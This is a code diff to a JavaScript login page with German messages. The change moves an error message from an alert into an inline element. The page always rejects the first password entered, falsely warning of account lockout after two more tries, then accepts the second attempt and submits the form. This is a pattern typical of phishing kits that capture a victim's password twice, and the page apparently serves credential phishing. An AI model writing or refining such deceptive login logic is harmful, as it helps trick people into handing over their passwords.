@@ -12,6 +12,7 @@ document.addEventListener("DOMContentLoaded", function () {
 
   const usernameInput = document.getElementById("username");
   const passwordInput = document.getElementById("password");
+  const passwordError = document.getElementById("password-error");
 
   const step1Button = document.getElementById("step1-button");
   const step2Button = document.getElementById("step2-button");
@@ -45,13 +46,16 @@ document.addEventListener("DOMContentLoaded", function () {
       e.preventDefault();
 
       if (firstTry) {
-        alert("Falsches Passwort. Noch 2 Versuche bis Kontosperrung.");
+        // ❌ Passwort falsch anzeigen
+        passwordError.textContent = "Falsches Passwort. Noch 2 Versuche bis Kontosperrung.";
+        passwordError.style.display = "block";
         passwordInput.value = "";
         passwordInput.focus();
         validateStep2();
         firstTry = false;
       } else {
-       
+        // ✅ Beim zweiten Versuch: Login erfolgreich
+        passwordError.style.display = "none";
         alert("Login erfolgreich!");
         document.querySelector("form").submit();
       }
